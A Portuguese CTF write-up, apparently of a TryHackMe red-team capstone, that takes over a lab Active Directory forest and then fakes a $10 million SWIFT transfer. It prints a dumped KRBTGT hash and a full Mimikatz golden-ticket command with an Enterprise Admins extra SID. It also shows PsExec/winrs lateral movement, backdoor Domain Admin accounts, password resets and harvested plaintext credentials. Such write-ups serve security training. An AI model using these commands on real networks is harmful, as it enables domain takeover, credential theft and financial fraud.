> [!Muito importar destacar]
> A conexão via RDP só foi possível após a alteração do tempo limite (timeout), que anteriormente estava impedindo o estabelecimento da sessão.


# Sétima Flag
![](attachment/2706e8ab8616a3024dcd12be5e220da7.png)
# Oitava Flag
![](attachment/32d0e9a9349269e7d689d82df192b796.png)

# 12. Comprometendo o Domínio ROOTDC

Para poder fazer uma análise melhor de todo o AD será usado o  `PowerView.ps1`

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-ADForest


ApplicationPartitions : {DC=ForestDnsZones,DC=thereserve,DC=loc, DC=DomainDnsZones,DC=thereserve,DC=loc, DC=DomainDnsZones,DC=corp,DC=thereserve,DC=loc, DC=DomainDnsZones,DC=bank,DC=thereserve,DC=loc}
CrossForestReferences : {}
DomainNamingMaster    : ROOTDC.thereserve.loc
Domains               : {bank.thereserve.loc, corp.thereserve.loc, thereserve.loc}
ForestMode            : Windows2012R2Forest
GlobalCatalogs        : {ROOTDC.thereserve.loc, BANKDC.bank.thereserve.loc, CORPDC.corp.thereserve.loc}
Name                  : thereserve.loc
PartitionsContainer   : CN=Partitions,CN=Configuration,DC=thereserve,DC=loc
RootDomain            : thereserve.loc
SchemaMaster          : ROOTDC.thereserve.loc
Sites                 : {Default-First-Site-Name}
SPNSuffixes           : {}
UPNSuffixes           : {}



*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-NetDomainTrust -Domain corp.thereserve.loc

SourceName          TargetName       TrustType TrustDirection
----------          ----------       --------- --------------
corp.thereserve.loc thereserve.loc ParentChild  Bidirectional



*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-NetDomainTrust -Domain bank.thereserve.loc

SourceName          TargetName       TrustType TrustDirection
----------          ----------       --------- --------------
bank.thereserve.loc thereserve.loc ParentChild  Bidirectional
```

## 12.1 Entendo Florestas de AD
**Parent-Child Trust:**  
Quando novos domínios filho são adicionados, uma relação de confiança bidirecional e transitiva é automaticamente estabelecida pelo Active Directory entre o domínio filho e seu domínio pai.

**Transitive Trust (Confiança transitiva):**  
Uma relação bidirecional é automaticamente criada entre domínios pai e filho em uma floresta do Active Directory da Microsoft. Quando um novo domínio é criado, ele compartilha recursos com seu domínio pai por padrão, permitindo que um usuário autenticado acesse recursos em ambos os domínios (pai e filho).

**Bidirectional (Bidirecional):**  
Usuários de ambos os domínios podem acessar recursos no domínio do outro.

**Explicação Didática:**
Pense em uma **árvore genealógica**, onde temos um **domínio pai (ex: `corp.local`)** e domínios filhos (ex: `hr.corp.local, it.corp.local`). No Active Directory, quando você cria um domínio filho, o sistema **automaticamente estabelece uma “ponte de confiança” entre eles**.

Essa ponte:
- É **transitiva**, ou seja, se A confia em B e B confia em C, então A confia em C.
- É **bidirecional**, ou seja, **os dois lados confiam um no outro** — tanto o pai confia no filho quanto o filho confia no pai.
  
Na prática:
- Se o usuário `joao@corp.local` quiser acessar um arquivo em um servidor de `finance.corp.local`, **ele pode**, porque há uma confiança entre os dois.
- Isso facilita a **gestão centralizada e o acesso entre diferentes domínios**, sem precisar configurar permissões manuais entre cada um.

![](attachment/6c65b5cdd639a1b9315063de63d6b921.png)

Então para entender, o Domínio `CORP` confia no domínio `ROOT` e o domínio `BANK` também confia no domínio `ROOT`, tanto o domínio `CORP` quanto o `BANK` confiarão um no outro, pois o tipo de confiança é **transitivo**. Por tanto, se comprometermos um domínio filho, podemos acessar o outro domínio filho

## 12.2 Explorando a confiança transitiva
Um ataque de **Golden Ticket** é uma técnica que permite **criar um TGT forjado** (Ticket Granting Ticket), utilizando o **hash da conta KRBTGT** (a chave secreta do KDC). Com esse TGT falso, o atacante pode **acessar qualquer serviço no domínio**, assumindo o papel de seu próprio **Ticket Granting Server (TGS)**.

Para realizar um Golden Ticket básico, são necessários:
1. **FQDN do domínio**  
    → Ex: `corp.thereserve.loc`
2. **SID do domínio**  
    → Identificador único de segurança do domínio
3. **Nome do usuário a ser forjado**  
    → Ex: `Administrator` ou outro
4. **Hash NTLM da conta KRBTGT do domínio alvo**
Com essas informações, o invasor consegue criar um ticket falso válido **para qualquer serviço dentro do domínio CORP**.


**Mas... e se quisermos ser Enterprise Admins da floresta (ROOT)?**
Para isso, **não basta um Golden Ticket no domínio filho**. É preciso **escalar confiança entre domínios**.

**Como escalar para o domínio pai (ROOT)?**
1. O domínio `CORP` (filho) **confia** no domínio `ROOT` (pai) via **trust bidirecional transitiva**.
2. Você pode **forjar um TGT inter-realm** (entre domínios), dizendo:
	-> “Eu sou um usuário do ROOT com privilégios de Enterprise Admin (EA)”.
3. Para isso, você **inclui um SID extra no ticket forjado**:  
    → o **SID do grupo Enterprise Admins (EA)** do ROOT  
    → assim, o ROOTDC aceita o ticket como se você fosse Enterprise Admin real.
O que mais você precisa para fazer isso:
- **SID do CORPDC**  
    → Para construir o ticket dentro do domínio filho corretamente
- **SID do grupo Enterprise Admins (EA) no ROOTDC**  
    → Para **injetar como SID extra (ExtraSIDs)** no ticket e obter **controle sobre toda a floresta**

## 12.3 Obtendo KRBTGT Hash
![](attachment/3b9a304fb583290a919674e2f501040d.png)

> [!KRBTGT Hash]
> krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0c757a3445acb94a654554f3ac529ede:::


## 12.4 Obtendo Domínio SID do CORP
```
*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-DomainSid
S-1-5-21-170228521-1485475711-3199862024
```

## 12.5 Obtendo Grupo Enterprise Admins SID para Domínio ROOTDC
```
PS C:\Users\Administrator\Desktop> Get-ADGroup -Identity 'Enterprise Admins' -Server ROOTDC.thereserve.loc


DistinguishedName : CN=Enterprise Admins,CN=Users,DC=thereserve,DC=loc
GroupCategory     : Security
GroupScope        : Universal
Name              : Enterprise Admins
ObjectClass       : group
ObjectGUID        : 6e883913-d0cb-478e-a1fd-f24d3d0e7d45
SamAccountName    : Enterprise Admins
SID               : S-1-5-21-1255581842-1300659601-3764024703-519
```

## 12.6 Mimikatz
```
PS C:\Users\Administrator> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/



mimikatz # privilege::debug
Privilege '20' OK




mimikatz # kerberos::golden /user:Administrator /domain:corp.thereserve.loc /sid:S-1-5-21-170228521-1485475711-3199862024 /service:krbtgt /rc4:0c757a3445acb94a654554f3ac529ede /sids:S-1-5-21-1255581842-1300659601-3764024703-519 /ptt
User      : Administrator
Domain    : corp.thereserve.loc (CORP)
SID       : S-1-5-21-170228521-1485475711-3199862024
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-1255581842-1300659601-3764024703-519 ;
ServiceKey: 0c757a3445acb94a654554f3ac529ede - rc4_hmac_nt
Service   : krbtgt
Lifetime  : 6/18/2025 9:40:31 PM ; 6/16/2035 9:40:31 PM ; 6/16/2035 9:40:31 PM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ corp.thereserve.loc' successfully submitted for current session
```

| Parâmetro                                             | Explicação                                                                                                                                                                                       |
| ----------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `kerberos::golden`                                    | Indica ao Mimikatz que será gerado um **Golden Ticket** (TGT forjado).                                                                                                                           |
| `/user:Administrator`                                 | Usuário que você está fingindo ser. Aqui, está forjando um ticket para o `Administrator`.                                                                                                        |
| `/domain:corp.thereserve.loc`                         | Nome FQDN do **domínio filho** (onde o ticket será reconhecido como legítimo).                                                                                                                   |
| `/sid:S-1-5-21-170228521-1485475711-3199862024`       | SID do **domínio filho (CORP)**, necessário para gerar um ticket válido.                                                                                                                         |
| `/service:krbtgt`                                     | Nome do serviço (fixo para Golden Ticket, pois usamos o hash da conta `krbtgt`).                                                                                                                 |
| `/rc4:0c757a3445acb94a654554f3ac529ede`               | Hash **NTLM da conta `krbtgt`** do domínio `CORP`. É a chave usada para assinar o TGT.                                                                                                           |
| `/sids:S-1-5-21-1255581842-1300659601-3764024703-519` | SID adicional (ExtraSID). Nesse caso, é o **SID do grupo Enterprise Admins do ROOT**. Com isso, você se apresenta como se fosse EA do domínio pai (ROOT), mesmo estando no domínio filho (CORP). |
| `/ptt`                                                | "Pass the Ticket" → O ticket será automaticamente **injetado na sessão atual**, sem salvar em arquivo `.kirbi`.                                                                                  |

**O que está acontecendo?**
Você está criando e injetando um **Golden Ticket** forjado para o usuário `Administrator` do domínio `corp.thereserve.loc`, **com um SID extra** que pertence ao grupo Enterprise Admins do domínio pai (`root.thereserve.loc`).

Com esse ticket, você **passa a ser reconhecido como Enterprise Admin na floresta inteira**, mesmo que o ticket seja do domínio filho.

```
PS C:\Users\Administrator> dir \\rootdc.thereserve.loc\c$

    Directory: \\rootdc.thereserve.loc\c$
    
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/14/2018   6:56 AM                EFI
d-----        5/13/2020   6:58 PM                PerfLogs
d-r---         9/7/2022   4:58 PM                Program Files
d-----         9/7/2022   4:57 PM                Program Files (x86)
d-r---         9/7/2022   4:55 PM                Users
d-----         9/7/2022   7:39 PM                Windows
-a----         4/1/2023   4:10 AM            427 adusers_list.csv
-a----        3/17/2023   6:18 AM             85 dns_entries.csv
-a----        4/15/2023   8:52 PM        3162859 EC2-Windows-Launch.zip
-a----        4/15/2023   8:52 PM          13182 install.ps1
-a----        4/15/2023   8:51 PM           1812 thm-network-setup-dc.ps1
```

## 12.7 Movimentação Lateral no Domínio ROOTDC

**Como o nosso Golden Ticket já está carregado na memória e temos acesso ao ROOTDC, o próximo passo é realizar a movimentação lateral para estabelecer uma shell nessa máquina.**  
Uma maneira prática de fazer isso é utilizando o `PsExec` para executar comandos remotamente no controlador de domínio ROOTDC.

`.\PsExec64.exe \\ROOTDC.thereserve.loc cmd.exe`
![](attachment/1e3bbe8bcd13dd5249fa4cdbd8d9858f.png)

Caso o `psexec64` não funcione ou retorne um erro como `Couldn't access ROOTDC.thereserve.loc`, uma alternativa viável é utilizar o `winrs`, que também permite execução remota de comandos: `winrs -r:rootdc.thereserve.loc cmd.exe`

Esse comando estabelece uma sessão remota com o `ROOTDC`, utilizando o protocolo WinRM (Windows Remote Management), e pode ser especialmente útil quando o SMB está bloqueado ou o `PsExec` falha.


# Décima Quinta Flag
![](attachment/09328344dd8eb872051dd8679af2cd23.png)

# Décima Sexta Flag
![](attachment/ee7a05b9cd51e1964f258f71c5d55f88.png)

## 12.8 Criando uma persistência
**`New-ADUser PK2212`**
Cria um novo usuário no Active Directory com o nome **PK2212**, mas **sem senha nem ativação** (por padrão, o usuário vem desabilitado).

**`Add-ADGroupMember -Identity "Domain Admins" -Members PK2212`**
Adiciona o usuário **PK2212** ao grupo **Domain Admins**, ou seja, ele passa a ter **privilégios administrativos no domínio**.

**`Set-ADAccountPassword -Identity PK2212 -NewPassword (ConvertTo-SecureString -AsPlainText "Password123!" -Force)`**
Define a senha do usuário **PK2212** como `"Password123!"`.

**`Enable-ADAccount -Identity PK2212`**
Ativa a conta do usuário, permitindo que ele faça login.

![](attachment/05a1fecb03fda0ab6bddb7d78a13e1a7.png)

## 12.9 Túnel dentro de outro Túnel
Essa parte foi especialmente interessante por conta de uma ideia de nomenclatura e arquitetura de rede que sempre achei curiosa e viável. Inicialmente, considerei a possibilidade de criar um **túnel dentro de outro túnel** — uma espécie de “rede sobre rede”. Como já tínhamos acesso à máquina **ROOTDC** (localizada na rede `100`), poderíamos ter feito esse acesso **passando por dentro do túnel da rede `32`**, que já estava estabelecido. Dessa forma, a rede `100` seria alcançada através da rede `32`, permitindo uma conexão RDP diretamente da máquina atacante.

No entanto, como também já tínhamos **acesso RDP direto à rede `100`**, optamos por um caminho mais simples: utilizamos o próprio cliente de RDP do Windows, ao qual já tínhamos permissão, para nos conectar diretamente à máquina desejada.

## 12.10 Resolvendo problema encontrado

No entanto, nos deparamos com um problema: o usuário criado anteriormente **não estava conseguindo autenticar via RDP**, o que levantou suspeitas. Para testar uma alternativa, decidi **alterar a senha da conta `Administrator`** diretamente.

Durante o login, percebi que era necessário especificar o domínio corretamente, então utilizei o seguinte formato:  `THERESERVE\Administrator`

Com isso, consegui autenticar com sucesso via RDP e obtive **acesso completo ao BANKDC**.


> **Lembrando que essa conexão RDP (Rede 101) está dentro de outra conexão RDP (Rede 100)**
![](attachment/ddde08aed503ff4592c47ab94263285d.png)

# 13. Entrando no Domínio BANK

# 13.1 Acessando outras máquinas

Como tenho **acesso completo ao domínio**, para coletar as **FLAGS nas máquinas WORK1, WORK2 e JMP**, basta **criar um novo usuário no Active Directory**
```
New-ADUser -Name "reduser" -SamAccountName "reduser" `
-UserPrincipalName "reduser@bank.thereserve.loc" `
-GivenName "Red" -Surname "User" `
-AccountPassword (ConvertTo-SecureString "RedTeam123!" -AsPlainText -Force) `
-Enabled $true -ChangePasswordAtLogon $false
```

Em seguida, concedo privilégios administrativos adicionando o usuário ao grupo **Domain Admins**
`Add-ADGroupMember -Identity "Domain Admins" -Members reduser`

Com isso, o usuário `reduser` passa a ter **acesso total às máquinas do domínio**, permitindo logins via RDP, execução remota e coleta das informações necessárias.

# Nona Flag
![](attachment/57e5a457ac0533c949bc2e67b125df22.png)

# Décima Flag
![](attachment/28b37334d5915ca6aa68fe2c436b2240.png)

# Décima Primeira Flag
![](attachment/1c8e4de42481346718226c48726072ab.png)

# Décima Segunda Flag
![](attachment/26dbdf989be5dcb58b91df56c864e404.png)

# Décima Terceira Flag
![](attachment/b5e3e0e786a92ae8d5deb97765abb7ad.png)

# Décima Quarta Flag
![](attachment/b5d1dcd8fd1024e7f3195efb29a6743b.png)

# 14. Domínio SWIFT
## 14.1 Enumerando o Domínio

**Inicialmente, criei um usuário no Active Directory com o objetivo de estabelecer persistência no ambiente.**  
Em seguida, passei a analisar os grupos existentes no domínio e encontrei dois que chamaram bastante atenção por sua natureza incomum.

![](attachment/cb39dbe16156a520301cbc5186041dd2.png)

Então eu inseri meu usuário criado nesses dois grupos e no `"Domain Admins"` (por conta de privilégios).

![](attachment/4ab8f0a0f4157caff4e25381946e9138.png)

## 14.2 Informações cedidas pela própria máquina (Capstone)

```
===============================================
Account Details:
Source Email:		antr4x@source.loc
Source Password:	uGHvfUXj4RDiLw
Source AccountID:	6855c1a7984e4a5197c07ad4
Source Funds:		$ 10 000 000

Destination Email:	antr4x@destination.loc
Destination Password:	Iwiv6cszxomFVA
Destination AccountID:	6855c1ab984e4a5197c07ad5
Destination Funds:	$ 10
===============================================
Usando esses detalhes, execute as seguintes etapas:
1. Acesse o aplicativo web SWIFT
2. Navegue até a página Fazer uma transação
3. Emitir uma transferência usando a conta Origem como Remetente e a conta Destino como Receptor. Você terá que usar os IDs de conta correspondentes.
4. Emitir a transferência total de 10 milhões de dólares
5. Depois de concluído, solicite a verificação da sua transação aqui (não é necessário verificar seu e-mail depois que a transferência for criada).
```

## 14.3 Fazendo a solicitação de transferência

**A primeira etapa do processo descrito no relatório consiste em realizar a solicitação de uma transferência bancária no valor de 10 milhões de dólares.**  
Para isso, é necessário acessar a aplicação web do sistema SWIFT, navegar até a seção destinada à realização de transações ("Make a Transaction") e, em seguida, emitir a ordem de transferência, informando corretamente os identificadores da conta de origem (remetente) e da conta de destino (destinatário). A solicitação da transferência é o passo inicial que habilita a continuação das ações previstas no cenário, sendo essencial para a execução completa das etapas seguintes.

![](attachment/b9de098546229124bcd76e4a3e0d5ca9.png)

# Décima Sétima Flag

![](attachment/09545e32df35e98dec921165855b7436.png)

# 14.4 Fazendo a captura das solicitações de transferência

Ao analisarmos os usuários pertencentes ao grupo **"Payment Captures"**, identificamos diversos membros, inclusive o usuário **"admin"**, que está atualmente infiltrado nesse grupo. No entanto, neste momento, esse acesso não nos oferece uma vantagem significativa, pois o objetivo atual é identificar **usuários com credenciais expostas em texto claro**.

Dentre os usuários listados, destacamos **"g.watson"** como um possível alvo. A estratégia, portanto, será **realizar a troca da senha desse usuário**, permitindo-nos acessá-lo diretamente e prosseguir com as ações necessárias sob o contexto de suas permissões.
![](attachment/979ae245f611b54e4361c51f5c3b6577.png)

![](attachment/8dee7d3d641e87e8ad121ff340364ae8.png)

Observamos que os usuários pertencentes ao grupo **"Payment Captures"** estão restritos a realizar autenticação apenas na máquina **WORK1**. Diante dessa limitação, o próximo passo será **analisar o ambiente presente nessa máquina**.

## 14.5 Acessando a máquina `WORK1`

Hmm, encontrei um arquivo que parece interessante.
![](attachment/fbe9171e42c8654d825310e4fdf25246.png)

E aqui, obtive a credencial em texto claro.
![](attachment/975bcc87b0fe07195db1d14ba684e75b.png)

> [!Credencial encontrada para a página SWIFT BANK]
> Corrected1996

## 14.6 Autenticando com usuário com privilégio
Agora, com a credencial em mãos, vamos nos autenticar.
![](attachment/a7aae13219dc972e94286483dfe58aab.png)

## 14.7 Transações capturadas
Certo, conseguimos reunir todas as transações pendentes para enviar ao último setor de aprovação. Mas, antes disso, precisamos acessar a página inicial e confirmar a transação utilizando o PIN que recebemos por e-mail.
![](attachment/e3a03a55ca1d0e81cd20ebe625bd0cdb.png)


# Décima Oitava Flag
![](attachment/b2093a08c3e604fca993c1b476eedc4b.png)

## 14.8 Explorando usuários do grupo "Payments Approvers"
Agora, preciso mudar a senha de um usuário que está no grupo **Payment Approvers**, para conseguir acessar a máquina **JMP** e procurar senhas e arquivos que possamos explorar para aprovar a transferência de 10 milhões. Começaremos pelo usuário **`a.holt`**, e, para isso, alteraremos sua senha para **`Password1!`**.

![](attachment/25af92e5fe79bb00b1a226754915235c.png)

### 14.8.1 Acessando a Pasta do Domínio
Então, comecei a pensar que poderíamos verificar se o usuário possui algum acesso direto a pastas do domínio e se há nelas alguma informação que possa ser interessante para nós.
![](attachment/0e907589172c0d78ba6689a57286b955.png)

### 14.8.2. Encontrando um Script de "Aprovador"

Na pasta de scripts, havia apenas um arquivo em Python que, ao ser analisado, revelou uma automação incompleta para aprovação de pagamentos. No entanto, o arquivo continha uma senha em texto claro, o que facilitou a autenticação e permitiu que realizássemos a aprovação manualmente.

![](attachment/23b78872891a293c4de9af060fa9ba8f.png)

![](attachment/d7b3c896c9e587653ff60bbbf4b56f15.png)

> [!Credencial de Aprovador encontrada]
> username = "r.davies" #Change this to your approver username
> password = "thereserveapprover1!" #Change this to your approver password

### 14.8.3. Aprovando a Transferência de U$ 10 Milhões
Com todas as informações e credenciais obtidas, cheguei à parte fundamental do que foi solicitado anteriormente: a prova de conceito demonstrando que é possível realizar uma transferência de uma conta para outra. Além de solicitar a transferência, também conseguimos efetuar sua aprovação.

![](attachment/00b146a323435a3e84f919b3b94be4c9.png)

# Décima Nona Flag
![](attachment/7406090d984049bab0faa338f9414da5.png)

# 15. `SWIFT`: Transferência Fraudulenta Concluida

Para finalizar essa máquina a aplicação passa as seguintes instruções
```
Esta é a verificação final! Por favor, não tente fazer isso se você não tiver concluído todos os outros sinalizadores.
Uma vez feito isso, siga estas etapas:
1. Usando suas credenciais DESTINATION, autentique-se no SWIFT
2. Usando o PIN fornecido no e-mail de sinalização de acesso SWIFT, verifique a transação.
3. Usando seu acesso de captura, capture a transação verificada.
4. Usando seu acesso de aprovador, aprove a transação capturada.
5. Lucro?
```

![](attachment/10bc6a3473c82f4c814e661427a6282c.png)

Basicamente, essa etapa finaliza as ações realizadas anteriormente. Com isso, concluo essa incrível máquina, que proporcionou diversos aprendizados e noções práticas sobre Active Directory, Windows, lógica e, principalmente, a importância de pensar fora da caixa.

# Vigésima Flag
![](attachment/038c14fc7f684736d81e8523c50b36c1.png)